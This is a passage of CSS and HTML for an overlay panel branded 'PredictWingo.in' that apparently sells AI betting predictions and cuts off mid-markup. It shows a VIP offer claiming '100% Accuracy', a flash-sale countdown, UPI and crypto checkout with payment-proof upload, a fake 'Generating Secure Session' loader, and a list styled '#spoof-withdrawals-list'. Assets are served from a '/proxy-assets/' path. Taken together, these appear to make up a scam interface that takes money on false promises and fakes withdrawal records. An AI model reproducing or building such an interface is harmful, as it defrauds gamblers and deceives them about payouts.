    color: #666;
  }
  :host(.light) .pay-conf-msg b {
    color: #f95959;
  }
  .pay-conf-acts {
    display: flex;
    gap: 12px;
  }
  .pay-conf-btn {
    flex: 1;
    padding: 12px;
    border-radius: 12px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s;
    border: none;
    font-family: var(--f);
    outline: none;
  }
  .pay-conf-btn.no {
    background: rgba(255, 255, 255, 0.05);
    color: #c8cad0;
  }
  :host(.light) .pay-conf-btn.no {
    background: rgba(0, 0, 0, 0.04);
    color: #666;
  }
  .pay-conf-btn.no:active {
    background: rgba(255, 255, 255, 0.1);
  }
  .pay-conf-btn.yes {
    background: linear-gradient(90deg, #fb8466, #bd5bd4);
    color: #fff;
    box-shadow: 0 4px 12px rgba(189, 91, 212, 0.3);
  }
  :host(.light) .pay-conf-btn.yes {
    background: linear-gradient(90deg, #f95959, #ff8080);
    box-shadow: 0 4px 12px rgba(249, 89, 89, 0.3);
  }
  .pay-conf-btn.yes:active {
    transform: scale(0.96);
    box-shadow: 0 2px 8px rgba(189, 91, 212, 0.2);
  }
  #spoof-withdrawals-list {
    display: flex;
    flex-direction: column;
    gap: 8px;
    margin-top: 8px;
    max-height: 250px;
    overflow-y: auto;
  }
  .w-item {
    display: flex;
    flex-direction: column;
    gap: 8px;
    padding: 10px;
    border-radius: 10px;
    background: rgba(255, 255, 255, 0.03);
    border: 1px solid rgba(255, 255, 255, 0.06);
  }
  :host(.light) .w-item {
    background: #fafafa;
    border-color: rgba(0, 0, 0, 0.06);
  }
  .w-info {
    display: grid;
    grid-template-columns: 1fr auto;
    gap: 4px;
    font-size: 11px;
  }
  .w-id {
    font-weight: 600;
    color: var(--t-title);
    grid-column: 1;
  }
  .w-amt {
    font-weight: 800;
    color: #fb8466;
    text-align: right;
    grid-column: 2;
  }
  :host(.light) .w-amt {
    color: #f95959;
  }
  .w-time {
    color: var(--t-dim);
    font-size: 9.5px;
  }
  .w-state {
    font-weight: 700;
    text-align: right;
    font-size: 10px;
  }
  .status-processing {
    color: #f5a623;
  }
  .status-success {
    color: #16a34a;
  }
  .status-failed {
    color: #ef4444;
  }
  .status-other {
    color: #8b8ea0;
  }
  .w-actions {
    display: flex;
    gap: 6px;
  }
  .w-actions button {
    flex: 1;
    padding: 6px;
    border: none;
    border-radius: 6px;
    font-size: 10px;
    font-weight: 700;
    cursor: pointer;
    transition: all 0.15s;
    font-family: var(--f);
  }
  .w-actions button:active {
    transform: scale(0.96);
  }
  .btn-approve {
    background: rgba(22, 163, 74, 0.15);
    color: #22c55e;
    border: 1px solid rgba(22, 163, 74, 0.3);
  }
  .btn-approve:hover {
    background: rgba(22, 163, 74, 0.25);
  }
  .btn-reject {
    background: rgba(239, 68, 68, 0.15);
    color: #ef4444;
    border: 1px solid rgba(239, 68, 68, 0.3);
  }
  .btn-reject:hover {
    background: rgba(239, 68, 68, 0.25);
  } /* ── VIP Pricing ── */
  .view-vip.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  @keyframes vipFadeIn {
    from {
      opacity: 0;
      transform: translateY(3px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
  .vip-pricing-shell {
    display: flex;
    flex-direction: column;
  }
  .vip-offer-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .vip-offer-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--vip) 32%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .vip-balls-track {
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 11px 8px 9px;
  }
  .vip-ball {
    width: 22px;
    height: 22px;
    border-radius: 50%;
    flex-shrink: 0;
    display: block;
    object-fit: contain;
    box-shadow: 0 1px 4px rgba(0, 0, 0, 0.18);
  }
  :host(.light) .vip-ball {
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
  }
  .vip-ball + .vip-ball {
    margin-left: -5px;
  }
  .vip-flash-strip {
    position: relative;
    isolation: isolate;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
    margin: 0 10px 8px;
    padding: 9px 10px;
    overflow: hidden;
    border: 1px solid color-mix(in srgb, #ff8a45 42%, transparent);
    border-radius: 11px;
    background: linear-gradient(
      115deg,
      color-mix(in srgb, #ff7139 19%, var(--card-bg)),
      color-mix(in srgb, #8b5cf6 18%, var(--card-bg))
    );
    box-shadow:
      0 8px 24px rgba(255, 103, 52, 0.11),
      inset 0 1px 0 rgba(255, 255, 255, 0.08);
  }
  .vip-flash-strip::after {
    content: "";
    position: absolute;
    z-index: -1;
    top: -80%;
    bottom: -80%;
    width: 35%;
    left: -45%;
    transform: rotate(18deg);
    background: linear-gradient(
      90deg,
      transparent,
      rgba(255, 255, 255, 0.18),
      transparent
    );
    animation: vipFlashSweep 3.6s ease-in-out infinite;
  }
  @keyframes vipFlashSweep {
    55%,
    100% {
      left: 120%;
    }
  }
  .vip-flash-copy {
    display: flex;
    flex-direction: column;
    gap: 2px;
    min-width: 0;
  }
  .vip-flash-badge {
    width: fit-content;
    padding: 2px 6px;
    border-radius: 999px;
    background: linear-gradient(120deg, #ff7139, #ff3f76);
    color: #fff;
    font-size: 7.5px;
    line-height: 1.35;
    font-weight: 900;
    letter-spacing: 0.75px;
    text-transform: uppercase;
    box-shadow: 0 3px 9px rgba(255, 71, 78, 0.24);
  }
  .vip-flash-saving {
    color: var(--t-title);
    font-size: 10px;
    font-weight: 750;
    letter-spacing: -0.1px;
  }
  .vip-flash-clock {
    display: flex;
    flex-direction: column;
    align-items: flex-end;
    flex-shrink: 0;
  }
  .vip-flash-clock span {
    color: var(--t-dim);
    font-size: 7.5px;
    font-weight: 700;
    letter-spacing: 0.7px;
    text-transform: uppercase;
  }
  .vip-flash-clock strong {
    color: #ff7548;
    font-size: 15px;
    line-height: 1.15;
    font-weight: 900;
    letter-spacing: 0.35px;
    font-variant-numeric: tabular-nums;
    text-shadow: 0 0 16px rgba(255, 103, 52, 0.28);
  }
  .vip-flash-strip-pay {
    margin: 0 0 8px;
  }
  :host(.light) .vip-flash-strip {
    box-shadow: 0 8px 22px rgba(255, 103, 52, 0.09);
  }
  @media (prefers-reduced-motion: reduce) {
    .vip-flash-strip::after {
      animation: none;
    }
  }
  .vip-perks {
    display: flex;
    flex-direction: column;
    gap: 2px;
    padding: 6px 10px;
    border-top: 1px solid var(--strip);
  }
  .vip-perk-item {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 7px 8px;
    border-radius: 8px;
    background: transparent;
    cursor: pointer;
    transition:
      background 0.16s var(--ease),
      transform 0.16s var(--ease);
    user-select: none;
  }
  .vip-perk-item:hover {
    background: var(--strip);
    transform: translateX(2px);
  }
  .vip-perk-item:active {
    transform: scale(0.985) translateX(2px);
  }
  .vip-perk-mark {
    width: 12px;
    height: 12px;
    flex-shrink: 0;
    stroke: var(--vip);
    stroke-width: 2.2;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    transition: transform 0.2s var(--ease);
  }
  .vip-perk-item:hover .vip-perk-mark {
    transform: scale(1.15);
  }
  .vip-perk-content {
    flex: 1;
    min-width: 0;
    display: flex;
    flex-direction: column;
    gap: 1px;
  }
  .vip-perk-title {
    font-size: 11px;
    font-family: var(--f);
    font-weight: 600;
    color: var(--t-title);
    letter-spacing: -0.15px;
    line-height: 1.3;
  }
  .vip-perk-desc {
    font-size: 8.5px;
    font-family: var(--f);
    font-weight: 400;
    color: var(--t-body);
    letter-spacing: 0.05px;
    opacity: 0.85;
  }
  .vip-perk-arrow {
    width: 12px;
    height: 12px;
    stroke: var(--t-dim);
    stroke-width: 2.5;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    opacity: 0;
    transform: translateX(-4px);
    transition:
      opacity 0.16s var(--ease),
      transform 0.16s var(--ease),
      stroke 0.16s var(--ease);
  }
  .vip-perk-item:hover .vip-perk-arrow {
    opacity: 0.7;
    transform: translateX(0);
  }
  .vip-perk-item:hover .vip-perk-arrow:hover {
    stroke: var(--vip);
  }
  .vip-offer-foot {
    padding: 9px 13px 12px;
    border-top: 1px solid var(--strip);
  }
  .vip-price-line {
    display: flex;
    align-items: baseline;
    justify-content: center;
    gap: 3px;
    margin-bottom: 2px;
  }
  .vip-price-old {
    margin-right: 3px;
    color: var(--t-dim);
    font-size: 11px;
    font-weight: 650;
    text-decoration: line-through;
    text-decoration-thickness: 1.5px;
    opacity: 0.72;
  }
  .vip-price-amt {
    font-size: 21px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.5px;
    font-variant-numeric: tabular-nums;
    line-height: 1;
  }
  .vip-price-unit {
    font-size: 10.5px;
    font-weight: 500;
    color: var(--t-dim);
  }
  .vip-price-meta {
    margin: 0 0 9px;
    text-align: center;
    font-size: 9.5px;
    color: var(--t-dim);
    letter-spacing: 0.05px;
  }
  .vip-checkout-btn {
    width: 100%;
    padding: 11px;
    border-radius: 11px;
    border: none;
    background: var(--pro);
    color: #fff;
    font-size: 12.5px;
    font-weight: 700;
    letter-spacing: -0.1px;
    cursor: pointer;
    font-family: var(--f);
    box-shadow: 0 2px 12px color-mix(in srgb, var(--pro) 30%, transparent);
    transition:
      transform 0.15s cubic-bezier(0.16, 1, 0.3, 1),
      box-shadow 0.15s cubic-bezier(0.16, 1, 0.3, 1);
    position: relative;
    overflow: hidden;
  }
  .vip-checkout-btn::after {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(
      135deg,
      rgba(255, 255, 255, 0.1),
      transparent 52%
    );
    pointer-events: none;
  }
  .vip-checkout-btn:hover {
    box-shadow: 0 4px 16px color-mix(in srgb, var(--pro) 40%, transparent);
  }
  .vip-checkout-btn:active {
    transform: scale(0.98);
    transition-duration: 0.06s;
  } /* ── VIP Select Payment ── */
  .view-vip-pay.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  .vip-hist-btn {
    width: 32px;
    height: 32px;
    border-radius: 10px;
    flex-shrink: 0;
    margin-left: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    border: 1px solid var(--back-bdr);
    background: var(--back-bg);
    color: var(--back-col);
    cursor: pointer;
    padding: 0;
    transition:
      color 0.15s,
      border-color 0.15s,
      background 0.15s;
  }
  .vip-hist-btn svg {
    width: 14px;
    height: 14px;
  }
  .vip-hist-btn:hover {
    color: var(--back-col-h);
    border-color: var(--back-bdr-h);
    background: var(--pro-lt);
  }
  .vip-hist-btn:active {
    transform: scale(0.97);
    transition-duration: 0.06s;
  }
  .vip-pay-shell {
    display: flex;
    flex-direction: column;
  }
  .vip-pay-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .vip-pay-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--pro) 28%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .vip-pay-summary {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 10px 13px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-pay-summary-lbl {
    font-size: 10px;
    font-weight: 500;
    color: var(--t-dim);
    letter-spacing: -0.05px;
  }
  .vip-pay-summary-amt {
    display: flex;
    align-items: baseline;
    gap: 6px;
    font-size: 14px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.4px;
    font-variant-numeric: tabular-nums;
  }
  .vip-pay-summary-amt s {
    color: var(--t-dim);
    font-size: 9.5px;
    font-weight: 600;
    opacity: 0.7;
  }
  .vip-pay-options {
    display: flex;
    flex-direction: column;
  }
  .vip-pay-opt {
    display: flex;
    align-items: center;
    gap: 10px;
    width: 100%;
    padding: 10px 11px;
    border: none;
    background: transparent;
    cursor: pointer;
    text-align: left;
    font-family: var(--f);
    transition:
      background 0.16s var(--ease),
      transform 0.16s var(--ease);
  }
  .vip-pay-opt + .vip-pay-opt {
    border-top: 1px solid var(--strip);
  }
  .vip-pay-opt:hover {
    background: var(--strip);
  }
  .vip-pay-opt:active {
    transform: scale(0.99);
    transition-duration: 0.06s;
  }
  .vip-pay-opt-icon {
    width: 34px;
    height: 34px;
    border-radius: 10px;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: transform 0.18s var(--ease);
  }
  .vip-pay-opt-icon svg {
    width: 17px;
    height: 17px;
    fill: currentColor;
  }
  .vip-pay-upi .vip-pay-opt-icon {
    background: var(--upi-lt);
    color: var(--upi);
  }
  .vip-pay-crypto .vip-pay-opt-icon {
    background: var(--crypto-lt);
    color: var(--crypto);
  }
  .vip-pay-opt:hover .vip-pay-opt-icon {
    transform: scale(1.06);
  }
  .vip-pay-opt-body {
    flex: 1;
    min-width: 0;
  }
  .vip-pay-opt-top {
    display: flex;
    align-items: center;
    gap: 6px;
    margin-bottom: 1px;
  }
  .vip-pay-opt-name {
    font-size: 12.5px;
    font-weight: 700;
    color: var(--t-title);
    letter-spacing: -0.15px;
  }
  .vip-pay-opt-desc {
    display: block;
    font-size: 9.5px;
    font-weight: 500;
    color: var(--t-body);
    letter-spacing: 0.02px;
  }
  .vip-pay-opt-arrow {
    width: 12px;
    height: 12px;
    flex-shrink: 0;
    stroke: var(--t-dim);
    stroke-width: 2.5;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    opacity: 0;
    transform: translateX(-4px);
    transition:
      opacity 0.16s var(--ease),
      transform 0.16s var(--ease);
  }
  .vip-pay-upi:hover .vip-pay-opt-arrow {
    opacity: 0.7;
    transform: translateX(0);
    stroke: var(--upi);
  }
  .vip-pay-crypto:hover .vip-pay-opt-arrow {
    opacity: 0.7;
    transform: translateX(0);
    stroke: var(--crypto);
  }
  .vip-pay-foot {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    padding-top: 9px;
    margin-top: 8px;
    border-top: 1px solid var(--strip);
    font-size: 9.5px;
    color: var(--t-dim);
    font-weight: 500;
  }
  .vip-pay-trust {
    display: flex;
    align-items: center;
    gap: 4px;
  }
  .vip-pay-trust .status-dot {
    width: 4px;
    height: 4px;
  }
  .vip-pay-trust-sep {
    opacity: 0.35;
  }
  .vip-loader-overlay {
    position: absolute;
    inset: 0;
    z-index: 50;
    background: rgba(10, 8, 28, 0.78);
    backdrop-filter: blur(8px);
    -webkit-backdrop-filter: blur(8px);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 14px;
    animation: viewIn 0.2s var(--ease);
  }
  :host(.light) .vip-loader-overlay {
    background: rgba(255, 255, 255, 0.82);
  }
  .vip-loader-label {
    font-size: 12px;
    font-weight: 700;
    color: var(--t-title);
    letter-spacing: 0.2px;
  }
  .vip-checkout-body {
    display: flex;
    flex-direction: column;
    padding: 4px 2px;
  } /* ── VIP Checkout + Submit Proof ── */
  .view-vip-checkout.active,
  .view-vip-submit.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  .vip-checkout-shell {
    display: flex;
    flex-direction: column;
  }
  .vip-checkout-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .vip-checkout-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--pro) 28%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .vip-checkout-head {
    display: grid;
    grid-template-columns: 1fr 1fr;
    border-bottom: 1px solid var(--strip);
  }
  .vip-checkout-stat {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 2px;
    padding: 9px 10px;
    text-align: center;
  }
  .vip-checkout-stat + .vip-checkout-stat {
    border-left: 1px solid var(--strip);
  }
  .vip-checkout-stat-lbl {
    font-size: 9px;
    font-weight: 500;
    color: var(--t-dim);
    letter-spacing: -0.05px;
  }
  .vip-checkout-stat-val {
    font-size: 15px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.3px;
    font-variant-numeric: tabular-nums;
    line-height: 1.1;
  }
  .vip-checkout-stat-amt .vip-checkout-stat-val {
    color: var(--vip);
  }
  .vip-checkout-qr {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 6px;
    padding: 12px 13px 10px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-checkout-qr-frame {
    width: 118px;
    height: 118px;
    padding: 7px;
    border-radius: 12px;
    background: #fff;
    border: 1px solid var(--card-bdr);
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
    display: flex;
    align-items: center;
    justify-content: center;
  }
  :host(.light) .vip-checkout-qr-frame {
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
  }
  #vip-qr-img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    display: block;
  }
  .vip-checkout-qr-hint {
    margin: 0;
    font-size: 9.5px;
    font-weight: 500;
    color: var(--t-dim);
    letter-spacing: 0.02px;
  }
  .vip-checkout-detail-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
    padding: 8px 13px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-detail-lbl {
    font-size: 9.5px;
    font-weight: 500;
    color: var(--t-dim);
    letter-spacing: -0.05px;
    flex-shrink: 0;
  }
  .vip-detail-val {
    font-size: 10px;
    font-weight: 700;
    color: var(--t-title);
    font-family: var(--f);
    font-variant-numeric: tabular-nums;
    text-align: right;
    word-break: break-all;
  }
  .vip-checkout-payto {
    padding: 9px 13px 10px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-checkout-payto-hdr {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 6px;
  }
  .vip-network-lbl {
    font-size: 8.5px;
    font-weight: 700;
    letter-spacing: 0.3px;
    color: var(--crypto);
    background: var(--crypto-lt);
    border: 1px solid color-mix(in srgb, var(--crypto) 22%, transparent);
    border-radius: 50px;
    padding: 2px 7px;
  }
  .vip-checkout-payto-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 8px;
  }
  .vip-address-val {
    font-size: 10.5px;
    font-weight: 600;
    color: var(--t-title);
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    word-break: break-all;
    flex: 1;
    min-width: 0;
    text-align: left;
    line-height: 1.35;
  }
  .vip-copy-btn {
    flex-shrink: 0;
    padding: 5px 10px;
    border-radius: 8px;
    border: 1px solid var(--card-bdr);
    background: var(--back-bg);
    color: var(--t-body);
    font-size: 10px;
    font-weight: 600;
    cursor: pointer;
    font-family: var(--f);
    transition:
      background 0.15s,
      color 0.15s,
      border-color 0.15s,
      transform 0.15s;
  }
  .vip-copy-btn:hover {
    background: var(--pro-lt);
    color: var(--t-title);
    border-color: var(--pro-bdr-h);
  }
  .vip-copy-btn:active {
    transform: scale(0.96);
  }
  .vip-copy-btn.copied {
    background: var(--mine);
    color: #fff;
    border-color: var(--mine);
  }
  .vip-upi-hint {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 5px;
    width: 100%;
    margin-top: 8px;
    padding: 0;
    border: none;
    background: transparent;
    font-size: 9.5px;
    font-weight: 600;
    color: var(--pro);
    cursor: pointer;
    letter-spacing: -0.05px;
    opacity: 0.85;
    transition:
      opacity 0.15s,
      transform 0.15s;
    font-family: var(--f);
  }
  .vip-upi-hint:hover {
    opacity: 1;
  }
  .vip-upi-hint:active {
    transform: scale(0.98);
  }
  .vip-upi-hint svg {
    transition: transform 0.35s var(--ease);
  }
  .vip-upi-hint:hover svg {
    transform: rotate(180deg);
  }
  .vip-checkout-foot {
    padding: 10px 13px 12px;
  }
  .vip-proof-section {
    padding: 11px 13px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-proof-section:last-of-type {
    border-bottom: none;
  }
  .vip-proof-lbl {
    display: block;
    font-size: 9.5px;
    font-weight: 500;
    color: var(--t-dim);
    letter-spacing: -0.05px;
    margin-bottom: 7px;
  }
  .vip-proof-input {
    width: 100%;
    box-sizing: border-box;
    padding: 9px 10px;
    border-radius: 9px;
    border: 1px solid var(--card-bdr);
    background: var(--back-bg);
    color: var(--t-title);
    font-family: var(--f);
    font-size: 11.5px;
    font-weight: 600;
    outline: none;
    transition:
      border-color 0.15s,
      box-shadow 0.15s;
  }
  .vip-proof-input::placeholder {
    color: var(--t-dim);
    font-weight: 500;
  }
  .vip-proof-input:focus {
    border-color: var(--pro-bdr-h);
    box-shadow: 0 0 0 3px var(--pro-glow);
  }
  .vip-file-zone {
    border: 1.5px dashed var(--card-bdr);
    border-radius: 10px;
    height: 96px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    background: var(--back-bg);
    transition:
      border-color 0.15s,
      background 0.15s;
    overflow: hidden;
    position: relative;
  }
  .vip-file-zone:hover {
    border-color: var(--pro-bdr-h);
    background: var(--pro-lt);
  }
  .vip-file-placeholder {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 4px;
    font-size: 10px;
    font-weight: 500;
    color: var(--t-body);
    pointer-events: none;
  }
  .vip-file-placeholder svg {
    opacity: 0.55;
  }
  .vip-file-preview {
    display: none;
    width: 100%;
    height: 100%;
    object-fit: cover;
    border-radius: 8px;
  }
  .vip-file-remove {
    position: absolute;
    top: 7px;
    right: 7px;
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: color-mix(in srgb, var(--pro) 88%, #000);
    color: #fff;
    border: none;
    display: none;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    font-weight: 700;
    cursor: pointer;
    z-index: 10;
    transition: transform 0.15s;
    padding: 0;
    line-height: 1;
  }
  .vip-file-remove:hover {
    filter: brightness(1.08);
  }
  .vip-file-remove:active {
    transform: scale(0.9);
  } /* ── VIP Order History ── */
  .view-vip-history.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  .vip-history-shell {
    display: flex;
    flex-direction: column;
  }
  .vip-history-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .vip-history-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--pro) 28%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .vip-history-list {
    display: flex;
    flex-direction: column;
    max-height: 300px;
    overflow-y: auto;
    scrollbar-width: none;
  }
  .vip-history-list::-webkit-scrollbar {
    display: none;
  }
  .vip-history-row {
    padding: 9px 13px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-history-row:last-child {
    border-bottom: none;
  }
  .vip-history-row-top {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 3px;
  }
  .vip-history-type {
    font-size: 11px;
    font-weight: 700;
    letter-spacing: -0.1px;
  }
  .vip-history-upi .vip-history-type {
    color: var(--upi);
  }
  .vip-history-crypto .vip-history-type {
    color: var(--crypto);
  }
  .vip-history-status {
    flex-shrink: 0;
    font-size: 8px;
    font-weight: 700;
    letter-spacing: 0.2px;
    text-transform: capitalize;
    padding: 2px 7px;
    border-radius: 50px;
  }
  .vip-history-status.status-pending {
    background: rgba(245, 166, 35, 0.12);
    color: #f5a623;
    border: 1px solid rgba(245, 166, 35, 0.25);
  }
  .vip-history-status.status-approved {
    background: rgba(16, 185, 129, 0.12);
    color: #10b981;
    border: 1px solid rgba(16, 185, 129, 0.25);
  }
  .vip-history-status.status-rejected {
    background: rgba(239, 68, 68, 0.12);
    color: #ef4444;
    border: 1px solid rgba(239, 68, 68, 0.25);
  }
  .vip-history-remark {
    margin-top: 5px;
    padding: 5px 8px;
    border-radius: 6px;
    font-size: 9px;
    font-weight: 500;
    line-height: 1.4;
    color: #ef4444;
    background: rgba(239, 68, 68, 0.08);
    border: 1px solid rgba(239, 68, 68, 0.15);
  }
  :host(.light) .vip-history-remark {
    background: rgba(239, 68, 68, 0.05);
  }
  .vip-history-ref {
    display: block;
    font-size: 9.5px;
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    color: var(--t-body);
    word-break: break-all;
    line-height: 1.3;
  }
  .vip-history-date {
    display: block;
    margin-top: 2px;
    font-size: 9px;
    color: var(--t-dim);
  }
  .vip-history-empty {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 5px;
    padding: 30px 18px;
    text-align: center;
    color: var(--t-dim);
  }
  .vip-history-empty svg {
    opacity: 0.45;
    margin-bottom: 2px;
  }
  .vip-history-empty-title {
    font-size: 11px;
    font-weight: 700;
    color: var(--t-title);
    letter-spacing: -0.1px;
  }
  .vip-history-empty-sub {
    font-size: 9.5px;
    font-weight: 500;
    color: var(--t-dim);
    line-height: 1.4;
    max-width: 200px;
  }
</style>
<div class="logo">
  <img src="/proxy-assets/logo.png?v=2" draggable="false" />
</div>
<div class="panel">
  <div class="panel-header">
    <div class="panel-title">
      <img src="/proxy-assets/logo.png?v=2" />
      <span class="brand-pw" id="brand-name">
        PredictW
        <span class="pw-in">
          <span class="pw-i">
            ı
            <svg class="pw-star" fill="currentColor" viewBox="0 0 24 24">
              <path
                d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"
              />
            </svg>
          </span>
          n
          <svg
            class="pw-smile"
            viewBox="0 0 20 8"
            fill="none"
            stroke="currentColor"
            stroke-width="2.5"
            stroke-linecap="round"
          >
            <path d="M2 2 Q 10 10 18 2" />
          </svg>
        </span>
        go
        <span class="pw-tld">.in</span>
      </span>
      <span class="ai-badge">AI</span>
    </div>
    <button class="close-btn">✕</button>
  </div>
  <div class="panel-body">
    <div class="vip-loader-overlay" id="vip-loader" style="display: none">
      <div class="scan-rings">
        <div class="scan-ring-o"></div>
        <div class="scan-ring-i"></div>
      </div>
      <span class="vip-loader-label">Generating Secure Session...</span>
    </div>
    <div class="view view-menu active">
      <div class="menu-shell">
        <div class="menu-home-card">
          <button class="menu-home-opt menu-home-pro" id="btn-pro">
            <div class="menu-home-icon">
              <svg viewBox="0 0 24 24">
                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" />
              </svg>
            </div>
            <div class="menu-home-body">
              <div class="menu-home-top">
                <span class="menu-home-name">Pro</span>
                <span class="card-badge badge-pro">Free</span>
              </div>
              <span class="menu-home-desc">AI-Powered Predictions</span>
            </div>
            <svg class="menu-home-arrow" viewBox="0 0 24 24">
              <path d="M9 5l7 7-7 7" />
            </svg>
          </button>
          <button class="menu-home-opt menu-home-vip" id="btn-vip">
            <div class="menu-home-icon">
              <svg viewBox="0 0 24 24">
                <path
                  d="M5 16L3 5l5.5 5L12 4l3.5 6L21 5l-2 11H5zm-1 3h16v2H4v-2z"
                />
              </svg>
            </div>
            <div class="menu-home-body">
              <div class="menu-home-top">
                <span class="menu-home-name">VIP</span>
                <span class="card-badge badge-vip">Private</span>
              </div>
              <span class="menu-home-desc">100% Accuracy · Private</span>
            </div>
            <svg class="menu-home-arrow" viewBox="0 0 24 24">
              <path d="M9 5l7 7-7 7" />
            </svg>
          </button>
          <button class="menu-home-opt menu-home-mine" id="btn-mine">
            <div class="menu-home-icon">
              <svg viewBox="0 0 24 24">
                <path
                  d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"
                />
                <path d="M12 6L7.5 12.5h3.5v5.5l4.5-6.5h-3.5V6z" />
              </svg>
            </div>
            <div class="menu-home-body">
              <div class="menu-home-top">
                <span class="menu-home-name">Mining</span>
                <span class="card-badge badge-mine">Auto</span>
              </div>
              <span class="menu-home-desc">Energy-Based Auto-Mining</span>
            </div>
            <svg class="menu-home-arrow" viewBox="0 0 24 24">
              <path d="M9 5l7 7-7 7" />
            </svg>
          </button>
        </div>
        <div class="menu-home-foot">
          <span class="menu-home-live">
            <span class="status-dot"></span>
            Live · Real-Time
          </span>
          <span class="menu-home-foot-sep">|</span>
          <button class="menu-home-tg" id="btn-status-tg" type="button">
            <svg viewBox="0 0 24 24" width="10" height="10" fill="currentColor">
              <path
                d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.28-.02-.12.03-2.02 1.28-5.69 3.77-.54.37-1.03.55-1.47.54-.48-.01-1.4-.27-2.09-.49-.84-.28-1.51-.43-1.45-.91.03-.25.38-.51 1.05-.78 4.12-1.79 6.87-2.97 8.26-3.54 3.93-1.62 4.75-1.9 5.28-1.91.12 0 .37.03.54.17.14.12.18.28.2.47-.01.06.01.24 0 .37z"
              />
            </svg>
            Telegram
          </button>
        </div>
      </div>
    </div>
    <div class="view view-tg">
      <div class="vip-header">
        <button class="back-btn" id="btn-tg-back" aria-label="Back">
          <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7" /></svg>
        </button>
        <span class="vip-header-label">Join Telegram</span>
        <span class="vip-invite-pill">
          <span class="live-pip"></span>
          Invite Only
        </span>
      </div>
      <div class="vip-hero-card">
